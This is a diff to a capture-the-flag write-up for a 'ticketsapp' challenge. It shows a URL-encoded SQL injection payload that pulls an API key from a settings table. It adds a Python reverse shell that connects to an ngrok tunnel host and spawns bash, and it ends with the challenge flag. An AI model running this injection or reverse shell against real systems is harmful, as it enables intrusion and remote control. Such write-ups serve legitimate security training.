@@ -16,7 +16,23 @@ There's a non-default table `settings` that gives us an API key.
 ```
 '%20union%20SELECT%201%2Ckey%2Cvalue%2C4%20FROM%20settings%3B--
 ```
+
+![alt text](/CTF-writeups/2025/brunnerctf-2025/images/ticketsapp-settings.png)
+
 You can use the API key to upload a malicious python module to get a shell on the box. Swagger docs is enabled (/api/docs) which allows you to discover this endpoint.
+
+```python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("0.tcp.ap.ngrok.io",10391))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty
+pty.spawn("/bin/bash")
+```
+
+![alt text](/CTF-writeups/2025/brunnerctf-2025/images/ticketsapp-api.png)
 
 Flag: `brunner{fr0nt_r0w_t1ck3ts_f0r_brunn3r_4nd_b455}`
 
